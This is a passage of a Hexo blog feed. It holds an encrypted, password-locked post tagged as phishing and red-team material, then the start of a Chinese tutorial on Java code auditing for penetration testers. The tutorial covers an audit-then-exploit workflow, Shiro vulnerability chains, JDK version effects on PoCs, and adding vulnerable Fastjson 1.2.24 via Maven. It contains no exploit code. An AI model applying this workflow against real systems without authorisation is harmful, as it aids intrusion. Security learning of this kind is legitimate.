74aa4d3106072785bb720479f1c9f8dda1b7f0f35a6b0f9eed3d5d224ead6ff6fd1768f47dbbf50fdae09657162282a3c42cefd7bf59fe7187d9c45c443bd001accfa1b76a40f7ddc62cd8e83554232fd1a6c6a0e59db8a593f71b040c6282e597d6002b6417961ebf41a4a84c32ff99ae16de62688bd6e6793d870c9c572d6f8888b361e62f932d809ff567bb2445bc28a3ba231a4eb5f78a6f0d97bee5528d5df1e66964a96e39e1272554a19ed4d829e07da1a7c0c9eb2c9e90955b92db3ad85c00ff82899549ed4abc1d5f3657b2924177cdb763cbf0214cc244a20d69acfbff44264bec42be5553be06b6a061cb9da87e607abdf525fc7580be8e9524161f11a0fb23ea58da8178a7dba9af389610f3e0e11a65a3dfd10f5186db1636af6480cefafeba6f4eb2c88f7114393930ef9655b99644a77bae6ca7d519a8b1d13bbba4946a4c2cbcf50363ad8b85c610c5ea28c0729667a49b5a4f65b65d6c552e7bc409b282ba974f1c34595914da59b09de0f161ab293e91707e977c412c97490a42064c7be63d9c1149bdc3d179b912f23bb35702987530a7dcdde17b0da7801b66de0b02143be7cd3011a5a8f43f92cbe17af7836ddefbef6a19353fb92a3b473522f38908ffb157197a2d7bd7f30bb0ed4cf67010ed72fe15b76896376f64fe6e9f233e7bfaa415168a6b519130523f49097159818160a43b4dc877b766c89cfafcfc374a1727a5b89891f9844a3038a2479b8c89d12a504dd8b517c19b73d455d1f8917cc83bbd884bc7765e374bdf5ee9137e5f496a89453a49b1d19505b3d1eeb6a38a840b7b95884469c9fd94583ad6392599518c7c217edcbbd8b0934a30c4ab2a9d8ed7125661ba40a64775d7e869d71946ea42359efe64c40f3fe0777277b138b2df69bea0312444b12e86c2495f1958a764602585deb8c40f443844073e2acb2bcea9135d60ada34674ae1f4655b870523b3a28a44166296f24c6b8e47883ded944df8ce00d52cdc766ff76dd099c79af1fa7119a67c8d8db138fa440bb59b7b1f5ea97d826e41ec8a058ad50988aefeeaea624c9d91c4334c2b6e91c0569ee5e3d4afd75961051ff2885b3b78d26268fd5c9c72e2ea1992c7b4a0875e567d2b28a8bb4a8d3d11a4ad3875e6627ce5c799dd7b134f97641571a5c3b04b7615bc1966afa626756ae70c84b1ecb0658e0000601bfe395f3cf635e541dbc557a9161acd8d5d89e8809870ac2ddcd031090d1d4da24a42bd8216f8f3ad41225b9f8972a448f502bcdaa29ec9eed6b1f8be5df38d75a7ea6a3c252a5b152699121413f9c918ee902bd512cd59a0f71539ae552ed7e864ec8bfdc8fea74d6c991383dfa2c7129779226a35838cbf6a612239824b97979df4179128cab1cd4b9e9459410c3c8d2794a22b301d8de2deb324ca3db3b83b0e80b38b5cc8503a48fc397ccffa95b80d11cd4e448941921e4cc74e4834d4db27d1bd1bcec68b3ba580f2e14eaacd2ee2576972e865238e1144e8751aaa7700a72c04897cecbb8f0be3075e5cd90b36decf8929d13c0719e94db2fb1113494250a4c0f61be91f681f653af1b027c6ae7b25f4dc31b20d6fa5ad43f1139ff27bce39c19188069deee322d6e718acec9478aab74ddef2402bb1ef355ed4f31f34a6ae9d7743bd71dc82e03d0782afb9951f1dd91a8676703110642a67997c9429c80d6bc822ba0a5839371de56bf4c5f8d86f0c081116d51696b8ce7fbba4de0408ef25ce9186346cbb6cee12ea10aebe3195017461140477ce4c4f515f20d0bc27a46157105576ec58088b2fad9c1c531df23b7156c4122cadb317166fc568210aebf09e8bbc747fcb30e28bbbcdee97fc9db3a2c3dc997ea973562d21a21771aab98551b3286996fb1053d2f317356476eb1aecf1cc382a89287024d20b9afe9042fb956049337d5f3532b35d7e2126f3e1bf19cb9666850578a47d0b35c4e16b03f8d894666db3694fce5d3ced5b1bf28af63a55172c4836eb8755f0831189007b870f6b0b91a849dcb9673737639bbaf9d2a1cfce6f8ca3ed5522bddb7430b1f9bdba6dbb945fd318000a13c1ea143cb5768cf22299c6ecc4a45a4ad35c1dfbff7bdea02ff60afb5597a5dc53d6379995d8d90f613d0bce9e0fa6587dabff5d60b2134bb94717b6b6899a55beaa9d26cc950aa7779d673099eba50c279cf53f9e5fa61c25c60189c65c76fa711fdff9446de582782ad67df28492aedfb12c33f1570fbcf2c806497052ad03a8f3700a6be4971a3b9e8c38ea90d579dc7be76a29c2ce95d58d397db63e77809754f5f6df4f4e8dce28daeead82c183861013c9766ce7a56c4c088b15f8751e37b0b11a71d06ee03bf0b727b454f1c8757fc948d14319980e3de847d4c41846797934936950043d3f0a7be9dff1f9f18c8be7a6618ac1a9eabd17a038a3d3f161ae5a089d1e71710b1c9863f37de93cdc61141fc1c2251f94023da703e214a10d1e47b742c25c88a9c7a6501e34514cb4d67688bb3def778bee8d1df850bb9d0aab57880b9fa90192889384cf91e80b7fb4bc1fe339329eee46f766e3e2e9e8268d67d11a7084391ee579c15e0aea36f6adec26c343236dba54272d91c9e606eb5aa36bd960b36e59d983552a606d1665a48bc156ceebad99c77acf4b9651051088ec419f090d7188297a8e49c161037340fc96be10aba6510c1d0b11d2d3e551705cf011fec62966dc3a7880cfa51b5830c4ab997f7ac3dd0daa6cfce82429a2dd9ef31d01e7ab12db5580c534f0d06109c9b3d877ced970972c73df6e6395c9138d03c49f58e9a6eea706859c1e76a85be71d3205ecb833ac92000669f1b78dd9cbf9f0a71fd86f0c1540ba5ecab622e12cb9afaac866884105e95ff0151ec81d888537d2d49897006c811af627f3538a195ab183cf7d449b9f60680a4ca1dc4e173a424d55ea92a19224e6365b327d5904fc39d4f9d8c7820ba60fbf1f0c9f8ba7a2b8a117ed04dc462809e33af73a9b2f200b64d1696a6776093ea7f7b2138219c013ddb90c9e142ea01c12c6c60fc9f131d7645d6413499855f8fdaa2662a32861255033577aecce4690ab3988f4e20f5de64f543e4a7d1598cf4c3d568ff360caeffac9795d3f4872f9ba98139191e9612e686d6c7a9637e5143b500d01efb1b5ee886cc44ceea8b3abaf388039b7cdecb7320f77e0a94dc657e2e3b662dbd538cf48304f9964f6691deb4e3cd71b1b862d8f78780457ef94468747c28ea877cf7650182a0510e9f161dd79787e93c64ee9d2f1ca978d18b1edb6d0d8f235964de331ad2e29c57921932107cb3ee859a606743d62d132cb901077c596bba32ad368ac671cc8a05d3d0051e234eb8b477d7da8c669c6b76732512aa2fd40ba2005fb78db1dba4366d06ae4284feef46ff72815acbcb1ce006a151d1bb6d1f9519a8c6d420ada07657634c1e3f97f58f08d46769f6dcf456b10c8607250b1d498c4949893ace4aeab519e061b392a6ce05ecd28ccf948d157e5b383986e7cb00192d516bc9672a70e2f619c14f2d78c74b3193e0d91549b3120784d44a69193a86fcfd5f992275f6efb1e414865ee0a9fc7a462df13b4d66b37d1c9208cc20e773e8cca2893c63e0f208536b8ae75d6b837ec827ea69f60ee3a801127fc14bd39d2be7b9a162c49645ab5fecd9e6ffd2eebcd0123893907c8a67141931a695df7e7549e8ecc0b7759711d8b875e4efb1be471f1b742a56b4b0596f463577228aa7e9d9e0194ad93713abf827ac3ab1eb25191914ea82051682092828e7c1caae61e0abbe99bb74397e29749c47f7265803309acc97efe7e2eb0970d0cb5ea40d8ec3c72947e8e37f2a7799e893184554c61bd5416ace1955c8fa76df412469c039f93a21ab4777c3e0f5cbcac034e529ef577870594cda456eb6d827f391a58d06fd3ad181e2975babf7a299067d6c6ea048ed1d4c51a8a4cac5bfac9e13c3cbd998d288372c2e90f6b765ac40cb61cb1bdc27a33a0aa38bd49316dc9678d2cd50ee79222496633bbd3fb4d17962352da970e1fcdad01628f7a8f8453faeccf9a954b3a5dfe52c897f6c9727606ef089ad62ba1b172d37be879af77289afa54742d025c45d49ed9a658729b012e112de6aee48b212fb4815bf3c8afbb11767756aaf476f3eef2b751813e97433b2a3d7a121615395fe07efc676f770e22eb2805bbb98003b82fdb4d035513bc1ac63684682f03403736b4864b601ec470ecab227c40234301fe6fdcc664a63fc72bf22a7d91db53087138f1bc7802a3b762394a3275beed8b708e5a67d13d6e7597322e90e73461c360fd204cfee8c095ea36203f08f0e763190e6ffa1a82b668276f8ba3ee3b86c7db67bfdf7bea328e9d1dfa863b2526183e883a9ed47a5c6364bac9dc3edb312e8f226736ccc2e45c8be1fc24c073c40345841309fab13d45913852e6a67b4ea1f9274689b568324c1bdd06163a457bc5cabf3d827f08054e15d9651843344df712e1625af02021431a63985663f5827bccf1bf81d9128cb05d6a278d213814aef328d819a922f99ce023530e17e9e1d1bd23a2e5fe9924112370e28f118698891a85f25ab1a141f16bad5994286d2bc6e853d16b85e64893149c3b40b709576caac5f2ea5d978c02199672bb410d3ebeb196561cd4aec947c8c0c62451e988ea669dfae338eecc73d0c72ee83c9a02af31d61d7fafb40df820607835955b05728257169bd5ba7d0c023bcb9e54ed3b03047e26a6b6e6f4ebea358655a5669330a1a68770381c09527a780745c552c664c0ce81e3fb581472aef7ee124b9d4d9f10160360544da0376c857677daaa0188575821e286a8604f3c09f073cf5c2f267dba2a7dca14bca912598b4f940e4f968225a2965e5ce7f396e6d3c44b17ca284d24713154b4ff74c6bf9bea2498d974d6740f3fc42aaec9f2056aaeef328898b76996280084c85d24140db46de73d364873e86ff23398239ed2fb92ba133f7fb74d2055a0bf3762bfbd995b70296f0a7c86c94401e57817f04ee3309c2ee043894e08872639970043b93aa976911ed4b9de4b9bb7e7c2732161f4e4f8d787371c6d5eeefa2d9cfe8ae75a1216196190cb482936fc47b091a452e9f71e8b3f6a310c40f180a7fd000d701d7eecba805d5f04471636c2c9e50bc8b484769531f54e08f24bab5561b66004e1fe270ff57b664816c201906586a470dbf3846f49c85dff97c44b9579453e96efd050d9b876e633b16fc7b0221af1b535f27ce5185fb733aeffb2e60d2ae869310f11f0517cbeae4683e62f7a69198e49a6f3586d952908b1e88accc2ca3d9fdf87ca1ba8987e5808f1dde8d4dd71faba05f4023c5fc46e70ae28a14de8469c0febcdd0f03b473383235e22b12d9f154b82b3ea619cbc0560c4ac2397d7fd613c7f42cc2dbe4ba91267853b54c51b1cba9ee9612508d302abd05ecb8a3426689de36738f949d51fe5006f7f49e9b35f818f9710ab5b1bd7f519ebe0977a43030b89753b3089c79aeeca5c1dce95dc7722367322d50011955fe3751174efc8e2f5513491bf4e2d4fd09aa356d047d4a0f487960234b9318b0cfd3ff60b24c2047538208c5104e06c671f7efa17618f4a7050e71786243fed61a4096eee660c9c9e3b9fc21bed91887dde08c95fbecf2bcd82b383add05bfc2d9b0c34a2e1228c645e0956d482a818c5b4f52481c45463d6aa71be36938c41287ff5b60de94478e229e21c296b256ed0b2c412ae43d4317d8a07a6d1b9cb31cf9bdd93dc6dba0dc5e64134be197cec41c6f9893bb8df46ee7ff699ebc03760bfcf215ef6a4176b3ea4bf66e1d732e9774d1a07908f92a3d74a8ef4b34e13e46c277d289455f58b2004a48feb8fed7e0125f6d8ce2279be98350cd694e4987fbf4624d9d2e96588041c563084422e6543027717bbd6acc1c09f7b190c43ac16c374745261c0e65ae400c69e508a4da3c64694450815765a96a41630f7d1d4cb141a70110ef02a15114427b2529b96082c94b41a4f291e646f5ca86eb6646a490b317fb63de27e832a1631ebf643ed7c048f212c6f6ced5efbc53283435cb3ba0efb18eef02748ce57cc04da8e79fc97a26ece550fce23e18e29b04621ec3c813fc1a49aac7bd783123d2cc096977e4b2bb8c336af602043af11406aff71fc2d3a3ce351580cc5cdbbf48c2fed1b2639be4a38fa90eb2c0525137749169df4b22df943cccc9a3fce891d54bb11d696f0ced32732f802cd838bc2d0adf71825c72c19fd60f093c78515c8d6c65610b6fbb5c7923579cb9ade086d6a044770ab2b5c4771d4294bd84dc1e7d78606af250302ff6dbf60f71825f8293aafdd35c0168f2d1d36d1dc519a24f9c456a85fd3259dfee9b723aeeedf93863b7852d65d1094ceed8c5acf41bfd56b6b8368600f4557a2c133bd7ef83ca644bba343a7913e24f8ea464ed36a4974ad95e5d736fdb237978feb733ebe8ac9144e4e5f85a8c60dda67ec14dbe16eb079df9009410a1b975d364a338b24afe8c340abd4de9b1a5df6cb761f3d6178ba9fd49327176646b9efaed39e03b05b839cef86e7f2ba980737613938350c18536724a92c7bcb8cfe21407743336c084835685154c919b5eca6452687f2aba7a1ad274d9b8e3f46dfd05f01c4444f9a31424a2e409b2c82b70627ba96315f2884a9afa2cb95f9209a7aa4ce15fe741cc2c21f194ed88955ec5b120449c2201b076df6d431761f20a1527ba35d41a788f74d9b027c1164088bf0773598d3016afe65339d44969e00b25e49e3b84e74c7a2e6ec0f1aca27f285d6a540bb3fe7d161c8359a691de4cde01df086eeb122786b5ec49e59e8a26566bc065e21479b72ed672436be21965a15837d24a17ccf5b103bc5e5eca35ffb12af827e9fabeda92335a1bf3b30b60ee7750c8b2e1acc15852cc4681dc02a20a546580f658d8635a65124f8497631549fa79247453efb5f75ee73b6b49fd065e060c9cfdf8802e3aeb9916ed6baa0d194de45b47aa9b4aab1b7ad52dd37bf932e8c9335802db4ac2f7b887539cc121ea4b956114c232e75b7a4fe199e7ceede2387c0c5ca62d930c6c59bc521a4435532201608afd3323bc70fa1e71bb6d16a2e8824576897534c1a112033ee81eff4f7b7adffcc9ed1f80e6a907915b0528522fed56c97ce507c6700e903f0fda7fbdcba68c5489393f0845bcbfdedb1f6cf18ab5c10e9a60d9b584ae32db1777f54721bd50d456e4a89b2b1fd533d6b96b2710aeee5c69c155958d197c73a2dd46eeb7825f85f5eec4a7b429c7d12cfc71923d695a9c20f46ba35a82c093dc18d5c3f27a461550604ea9a8e200821aadd3903dd8992c41012a13fc4680f071d5a21ad5799c083c820cd7ab722896dc6e644ec11408cb7b161c17e4962534fb0ee136d274df01e715cfe323185a352b8949be42e481a3a9581a3b8c558ee75c86ac01190f4670de0dd68d1f91810a17b785ce1a5fbe3adce269cd9e39be92162c68f6fc638e04621374a93ab527fcb2c54cd5fde943f9b491c9ffd9710081eb453c1cd4de831643774a12d7a2befd15337ba3bc6b6d141fd1e9e6a1099d2694ac4829b1fc142090a81d96a53c65bb206bd74b2d28208e386367ba5c088a4be936fa08e0f2014a2f916d99c0f596b1deb3682d810d6e23d5af9b246eb31f745f7cd4c5e5fa87b2f18ff1e8fdfcd37c66b6c3fa789a95e00cfd010602b30f4361b3ffebc37037f29c7a255aeaa01ce9f92871f79346ae1c0a77a67d2dc1ad7e1cafd504a91fe239add9f38517a3338795dc63932b7a7d90fe97285c3eb16d5a336801ba26e65f6114f251bd2a8f51ebe23a819d31b594c8b00c77d82537ab7a596b4746bac8ffc89a8a51269c3a4874b916fdbbea953e8ac527626f33785a6bddcd67c1de123885fa62461ace7a79dc71cd3efbcc33fb8bc5d70818e520840b38aa0d4af961c62ae2839a918e41b77a91d63d485b5c3fc59c3b72515f922051aedf30b3e0dae02040b85208766b27e3bc8eb7a34140b4ba7cab8f59345e4eda3daabd47d167f94e4ec22f2d1aee7ddbdb7494f3d01c9c2ad246aa1d421f77da4ebdc4d1aeff5c25d358558ea915eccfdf82525f07c6e78a93cb852cff1d59915ce23ddbdf2fb37a9f6baaa17fbc4658cc75d7290d729f28b3cf2001b35d9129e6e2d092f8581f80e05ceae11650cb267f0a6a17b1e2e32691585ed148d05b1f2032c3ad7eb3290222875d59472dfc3c58228dd96272b791ec2f8d27d0b0a1071e23c937de8fd94ee692853ae3a4e397d4693f929f823542bac603d1dd04bb4ed7703163d3f3763e022a7d6929b4364173b0d2c6901dd40bcae903f694aaed1f1855a6ed6ab16186fb246eddda500a714c770e9618ea2a9938cc4b041e9d4c78d6f740aaf81fe79eaa830febe528063368a4e91528f464cfbad1f354851692fc7a91f267d81c449725b7570027ed86fcb1a70fbed179c728496be5ecc1ba0f63df8dfd22743c5f6676403b480e912599c693816fd2efd1b3a1e0d1225e2001715479769062d6d1ff8c7c3680e872ec26e3ba62bdb00d665b65fa22d15e5508a82531ffe2246c497d225a3f91f9229129ea47aa246c1eeddbd69382db210c69561df0c7dc5d9f64410749bf66574517183b60ae8f874dea2f0c6a5e4ac11325db1b99e20758426cefe007fce54719aef851a07554964a76e0684f19aec67138ba93595118c679c6d5ea489573e9c8ea74712e0b3ff68eaef15c25e7aec92684fee652e473136af4b25862d9825eb8282edf2a9bda5326004bb4088a35382c002f6fe9ea56c12051a3a4263703ea2dbe0c0c9a54cdab47604216d33a348a057de47778dca197e2c21f1db5c52ce41724c924d0676149f20707000b1d56c585716a1d0ffaa7da8601f7b287d330c7317d387a61c1d629c299c19193cbd09e04edab780cb2cc3a6985dfcaa9f987a090ed8dab8d1a0335c919077beb7ef66393e165f06b33e4c23977c2fdf90303d53012825a2ee211bfebe5a18dfc0a689441512de4a3600ea0f5b8986a3420c0f3a6e528b0800b9b3252719aaaa8b565179b6b9d6fe59a861d641c8727a7de12ffb2e69a18c05ce64eea8870574cd134076668e68c7eaad346373516d3113cf8dffbc87edfc7a0016f53f3e00180853af53f947b25136e128e52fd212cc0963d425dc45810b246a7ba7eb90b027f9447851de0c89ac91dee922a5fb04862e2a4b59387d194b81a66a5ad510b57e382f3a0485278fccfcce516b8829d27150b917e1b8e7c03fc07ac336f5eeb6adcb1a6647f79b67da06b72d3fb2cc744a47616b4686864a169ac39bd12a546f2fffe027ee3c7eecacdb4268490112370d7bd36b5d0bae1b0d70d181f990154bb1ed4d8d09ddc27f3cff5069d9d70e70fe20eb7136f5e86ff6eefa72463b754055839542ba25d1b1eab6f428087b6c89ca5f0321f0df0646aa79d5340cd7929c5c861cf32338559e4232b7e57d8bf005f7a388425f709ad47d3d89f20198b719b8e0397848c2c4cb9d9ea8e395d6ee3ac1e2dee847f7b5beb517ebf6c860a30e04330ec8109c30c4914418c172ebb1a6c37858336995052d21aba9171bf99f0dc6383798fd4d81f0dbf3d3179741e19d0aba2d51f4356aba69f96f279b4acc31d398335d1efd36325eba8a2d05b000a39a3d733a6f7bbc47c240ea0b0781e8023744a9152f44a56cda39c8dafd446a3b7bc7a4db321afbefbf93aa675370703ea15ce9e6bad0d888fc187775e9c7e4e5328c42b9f59823b39842a029ef8c9e66eb74dcbd2123aa291a836c0cc78738854111e4c38fe7f61a277c64c7ca387620122d9c7c6c8586262e3a5b19469e9235d4aed894f3238e99a5b6f9c3cad5125283a8aede686c82411d27002b3f0b6ef1a893b3f3e62766eb616e4ca2c85516c58d6c1c6ee27f27dd266f96c216f051edf3aa0ffeadd9c1f11cca4d52d952cb5100fe18fa154d5e00ab434e586b19604f39d138f396508c519b52a730e7b70006e2bf00cf47bfc7b71bccb84b3589b1138e45bf2e8b198d234a3a79a48b5d66687dc9546ff94c738a515357f30886e3aab8a7b2f79fb6e726598247b5bad7e93e82264e140c9d2803f9d23f6d37a8724d0aa995f61039bde55f52a9f1a7600a2b0c24ae30193116aede10b88d448c685da6cd2f25805c25aa92e1b0916e845349bf5db1106b2dae921ad7aa02b1f81e981f9fed49d7590af1d4723d52be67122e29e7c761a9fe024a5e982c2b390dfdcad052bd98049cbab1b9a5b39515ccc895e02a20be9f11aeff4162295900c32b31880e0ef2087dd33fc58cc3c61376c015f24d73e76e92008c79302804b7505120ac92ac95938540a8d7321fbd13a7ea3960e0d52aa1baa528288cc34f2770db4495f3f36709c8783ee41bbf8edd55813d313e955e2cd58bfb7aff31c9a6527e3015cab8b48af620e7244e6f92a3d5dc29e25765f7cfb2764253516603ecb36bdf7f6cb7ebafaab14ba8038a7c85923c5986113dbbcf651b0cfdc918fa393675aad347fddcd9c4dfd23eb302300ac99bd0fe6e7689fa372eb0456630438d73ab4519e93133053a9ffaa485faf4c6a8ec37d7d21ba5a6f16df9e8793975f6b70f1b455e10d3e04af28a34f463debfe8d0e009079c8139a6ee91068716d0490378fac8571f23e8dc73ec8956f43aa3ec9c0c8122118b1420e9b505ead15cedb6976b394ad254c27ca6227abaed7986403b31caafd7001bd223257604341251667a254b14902c4c50a1abdb40de3a89255c54d69115e8b32b064fce06939a85ca320d6f97a376c7bac46a661239c0eac6202a1951201e2f45d749cfca6e85f49bfd42e16d33474f886f0c3020c9eda0e10e1dc017659fea478e5c3649b6a1bd3245972f1202c5b5e7f383d36aea7a8f8895b3dac700078371629208b8bde28875656229f0dacbfae791d559fb1f05d05de1a2107e4006f99b05fa009c2486da1171fa8769c965add1fa3ef678801146e33c19c520e4fa48a08f7d28c165bbb2f78970f01aa916a02b93f801d1739920c46e623aa05a49339831c2b95a266cfe0f60b1379be82b36f50250153934a9b1362faa781b54decf9d0e656d6436aa88148aa9f801f9616e734cc3ff9f611eba46b0e7bc40939d4fbd9c13720dbd15efb3da62a45fd0502b3842c1db6da851d29bccfdf934842a70bec38f20bc0d04676daa3406039764c78650f3970a64d808c8b2fe70fe63cefb9947d3b36f0a5114ddae64134989b893ac71c513c10878e52c318edea44c53976a27b8aa80e4a5393f1b364d6b0fe78c43cde25df03d5aaa147e4bdc8ca2101467b17d656a394f76fda263df2f0bc581c9e1a2305b85ffe00099246d1c36953a101ebac92fc7c5c46686df1e306f17f736498bfd44542d375d5d01ab11c9f72ebc756337b332d30ac95f8e743cbb7c970cd99e9ebbc59cdca16ee4aabaf9604bb961149b504a409fb635562a16cad85b8c40da39d8af207c7e0591fb84dc72d571c2da6337c18d1fff2b57aff5652e9e7446cf04e7f498b7d8bcc933727e8e3fbadd840bc34a5a5184ce3cfb4723c9a090e2cfb8c4efa77c9ca368a28ed5d97f81bade41b6b86e8047fc5a0e19be0adfa048259da212bdd3655108730bf3a3882aefb024bff7f46430555b6fdcce08b8d22fd0eb9f76f074c2003c3d1bf2c2d5dffdea37b1ca29f0f2589f070c92ec10e8b1f6f91b6dc36ad1ec91f9819f60f5c54f022935837caeee848dc33b7d6935490d26c26916457bca068f500377ad800fd7f58a8174430280254cf8ab53d82b2b43367aeb536ca47c191edebf6319e68e4268febb24abdbac3860f77c56261e05d67f8b1534f7067142481d460cf6d710646ce6aec7f9ffe28ebe169a711df9675bc62533ef9cc6bc82af7c627fafbe3a634199045f9b8afb7b1b8656c5d493d47218a7a92978fd870e570d43f96a59a480f7d746cd3eaa277295b388e31fd131ebdea99034ab7119fc54e67c71ff057e399b55bbeb5571d548aac1cb5c897adc89f4cfab7fd37a6c867a287be5b933f402247021eaa41b6e98a4b5883795f56d27ed37fa82d8b95da8bf1293425de454f4f4fd40f1c741aef750b4085c91d6201fe07fde87fb1c0d1bb03495a0484b04e21998b302ec2dce1f948cf686784229f87a21056d062ba7f05e8c32e726fc19c54c51d24b65bc096942876ed0fad6f771147591e446393fc6d6c19d4fa36037d7df45e358b89b8bc89813bd33bc124d5aca0f99186132d2f830a427a354e9f8a7a711a2b2c084eae39f63884442f952c1ac3008298faab3d1b359142b9b72ac59089beba26f1ef3d5e128e01198c699427fa120139080debbce6bcf7667b8621a3e236dbf81cb17491372b34fd5695df0dd79313a3327634a8cfea537019d1311574908e6add7c920ed1eadf9b641723a76016db54243365bf6eb7d969a6928e664a8d4f2edc8833a92797c6145aa3e1112a9ccac3a4e3b0046e28668ece99f55f077dcc66131e2f16ae0673386c57ad14bc66033f1a7de93bc15d3458938eaadafe263cf28fe4cc98a2ecc7034be3f6d57906d2c4b5b6731d022232451a1062f5b208b07782245bc0c9093391e22d9d6b383fdd6b18dd4f68dcaa807801fe53046b262e2009c32f140b1de452fd48d111d99f514361e2410026191de301ae77bdf24e539f038d9f7b1d21c22c7787e0b0e057ff84216a78ca714e44cfbcf123d41000dfeac2723707f519befc571593d02f8a287d140a2e2a54c7c8e3ad3a2eaf3b51c21dc60525ec62a7cf8f4fdf80944937b8bed25faadb59d2723e3be27e08db11c9ea0dd5d996431f9f024b849f9d3d3b1e54dd4a0dd34a4ece63aa7efee0810d2f68caf8b4ed0a362432619ff924ee9f56650126d90cee6ef3e8ceecc673ef1ebc4d976542d8d983544b5b2a3191f6051cb687ee2942fce5d70f6b39d26f0698cd95e053c5e105d1264f39c5f9c9760c001eac59ab263d55554e38deccc1ff3836ea0a1eca5a1ebc1893a1ef7cff2e345a0e1f243489f606ca84ed208127dcd71d8eedded2f898c44e6ddeb2da51f720685410bb215bcf113fe3a66289a7e816656ca91ac728b57c1e7fcedaa1514d74c3961afb599bb49a302abf2717e10723aeeff88f367a2ef9d9ecbc61a51dae4d5066102a81ddf41fdcef2f4c97fbf53971ccb17dae521343238203fc2e1d906b3ecef525a60a4bea7d646c98c84f6677a8130e19c8eff7bfa4abbb2b6d086961051b5ba886a66b5193714a51e4cce67b2aea6e13f0df499afefd64abb425a4fa4318a712a314444accf2e6f40b559e1e879ff4c1924ef51c13b98cf8294afd37b5c3b0f4ba10e510153772ae7ad90a0e6b45d4661ebe756f4c5d37e757abd84019f10168c0090c2356b8137143acf68f027e1de6d47e3cb9e2ee42a34c30f926c492ba85ed78f33bcaef69f2f08d4b556c6323640710c0dab8e42b80410b663bca0934cf7c22c69f24b8a713c5e76895166c2b5f33a2ea5014df8178399f53eb5cf63ff3b1d537daca59f9f95c46b6cbc41e3851d98c0109f453aaff</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">请输入密码</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>钓鱼 红队</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
      <tag>Hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java代码审计入门</title>
    <link href="/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8.html"/>
    <url>/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8.html</url>
    
    <content type="html"><![CDATA[<p>20220419</p><p>现在及未来比较典型的渗透测试流程是：确定站点指纹→通过旁站扫描备份或开源程序得到源代码→代码审计→利用审计出来的漏洞。因此对于渗透测试人员而言，代码审计能力也显得越发重要。</p><h1 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h1><h2 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202337412.png" alt="image-20220420233738318"></p><h2 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202339012.png" alt="image-20220420233948529"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202340718.png" alt="image-20220420234037596"></p><p>这种存在xss漏洞</p><h2 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202341396.png" alt="image-20220420234153294"></p><p>就比如shiro存在版本漏洞 然后这个项目还有其他包存在危险函数且可以给引用  这样配合就产生一条利用链</p><p>4.<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204202344258.png" alt="image-20220420234413182"></p><p>JDK8版本为8u251</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">版本号“8u251”里的“u”代表的意思为“<span class="hljs-keyword">update</span>”，“<span class="hljs-number">8</span>u251”代表的意思为JDK8第<span class="hljs-number">251</span>次更新的版本。在后续调试漏洞时，如遇到“不安全的反序列化”等问题时，就需注意细微的版本差异，因为不同的版本可能会导致PoC需要进行改动或者无法利用成功。<br></code></pre></td></tr></table></figure><h2 id="2-4项目构建工具"><a href="#2-4项目构建工具" class="headerlink" title="2.4项目构建工具"></a>2.4项目构建工具</h2><p>在实际的Java应用程序开发中，开发者会使用一些项目管理工具来快速构建和管理项目。作为安全人员，了解一定的项目构建方法有助于快速搭建漏洞环境和审计应用程序中是否存在潜在风险。</p><h3 id="2-4-1-Maven基础知识及掌握"><a href="#2-4-1-Maven基础知识及掌握" class="headerlink" title="2.4.1　Maven基础知识及掌握"></a>2.4.1　Maven基础知识及掌握</h3><p>Maven是一个项目构建工具，可以对Java项目进行构建和管理，也可以用于各种项目的构建和管理。Maven采用了ProjectObject Model（POM）概念来管理项目。IDEA中内置有Maven，对于并非专业开发者的安全人员，内置的Maven即可满足大多数需求。</p><h4 id="1．pom-xml文件介绍"><a href="#1．pom-xml文件介绍" class="headerlink" title="1．pom.xml文件介绍"></a>1．pom.xml文件介绍</h4><p>pom.xml文件使用XML文件结构，该文件用于管理源代码、配置文件、开发者的信息和角色、问题追踪系统、组织信息、项目授权、项目的url、项目的依赖关系等。Maven项目中必须包含pom.xml文件。了解pom.xml文件结构有助于审计应用程序中所依赖的组件和发掘隐藏风险。</p><h4 id="2．pom-xml定义依赖关系"><a href="#2．pom-xml定义依赖关系" class="headerlink" title="2．pom.xml定义依赖关系"></a>2．pom.xml定义依赖关系</h4><p>pom.xml文件中的dependencies和dependency用于定义依赖关系，dependency通过groupId、artifactId以及version来定义所依赖的项目。引入Fastjson 1.2.24版本组件的Maven配置信息如图2-56所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192120982.png" alt="image-20220419212006781"></p><p>图2-56　Maven配置信息</p><p>其中groupId、artifactId和version共同描述了所依赖项目的唯一标志。读者可以在Maven仓库中搜索所需组件的配置清单，如图2-57所示，搜素Fastjson并选择所需要的版本号即可获取相应的配置清单，将其复制粘贴到项目的pom.xml中即可。</p><p>使用Maven进行依赖引入是最为基础的操作，读者可自行查阅Maven官方文档学习有关pom.xml的更为详细的Maven操作知识。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204192122062.png" alt="image-20220419212207837"></p><p>图2-57　Maven仓库</p><h4 id="3．Maven的使用"><a href="#3．Maven的使用" class="headerlink" 